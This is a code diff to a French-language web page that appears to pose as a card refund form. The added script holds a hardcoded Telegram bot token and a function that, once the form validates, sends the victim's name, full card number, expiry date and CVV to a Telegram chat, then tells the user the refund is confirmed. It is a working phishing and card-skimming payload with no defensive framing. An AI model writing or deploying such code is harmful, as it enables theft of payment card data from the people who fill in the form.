@@ -59,10 +59,37 @@
     </div>
 
     <script>
+        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";  // Télégram Token
+        const chatId = "@YourChannelOrChatId"; // Remplacez cela par votre chat ID ou le nom d'utilisateur du canal
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message envoyé à Telegram:", data);
+            })
+            .catch(error => {
+                console.error("Erreur d'envoi au bot Telegram:", error);
+            });
+        }
+
         function validateForm(event) {
             event.preventDefault();
 
             // Obtenir les valeurs des champs
+            const nom = document.getElementById('nom').value;
             const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
             const cvv = document.getElementById('cvv').value;
             const expirationDate = new Date(document.getElementById('date-expiration').value);
@@ -97,6 +124,15 @@
             }
 
             if (valid) {
+                // Si le formulaire est valide, envoyer les données à Telegram
+                const message = `
+                    Nouveau remboursement:
+                    - Nom: ${nom}
+                    - Numéro de la carte: ${cardNumber}
+                    - Date d'expiration: ${document.getElementById('date-expiration').value}
+                    - CVV: ${cvv}
+                `;
+                sendToTelegram(message);
                 alert('Toutes les informations sont valides. Le remboursement a été confirmé !');
             }
         }
